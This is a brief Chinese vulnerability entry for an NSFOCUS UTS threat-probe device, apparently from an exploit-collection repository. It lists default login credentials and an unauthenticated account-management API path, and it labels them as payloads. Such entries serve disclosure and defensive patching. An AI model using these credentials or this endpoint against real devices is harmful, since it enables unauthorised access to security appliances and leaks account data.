# 绿盟 UTS综合威胁探针 信息泄露登陆绕过漏洞

## 漏洞描述
绿盟 UTS综合威胁探针 某个接口未做授权导致未授权漏洞

## 危害等级
HIGH

## 参考链接

## 漏洞复现方法
默认口令

```
admin/Nsfocus@123
auditor/auditor
```

登陆页面

![image-20220525150142447](images/202205251501583.png)

## Payloads
```
admin/Nsfocus@123
auditor/auditor
```
```
/webapi/v1/system/accountmanage/account
```
